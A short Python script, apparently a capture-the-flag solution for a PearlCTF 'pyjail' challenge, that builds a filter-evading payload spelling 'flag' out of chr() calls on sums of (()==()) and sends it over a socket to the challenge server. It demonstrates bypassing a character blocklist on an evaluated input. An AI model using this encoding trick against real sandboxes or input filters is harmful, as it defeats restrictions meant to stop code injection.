from socket import AF_INET, socket
from ssl import SOCK_STREAM

blocklist = R"bdefgijklmnopstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789[].,_"
unblocklist = """achqrw()'"\\+- ="""  # see this and think of `chr()`...

payload = """flag"""
payload = (
    "+".join(f"chr({'+'.join(('(()==())',) * ord(char))})" for char in payload) + "\n"
)
print(payload)

s = socket(AF_INET, SOCK_STREAM)
try:
    s.connect(("dyn.ctf.pearlctf.in", 30016))
    print(s.recv(1024).decode("utf-8"))
    s.send(payload.encode())
    print(s.recv(1024).decode("utf-8"))
finally:
    s.close()
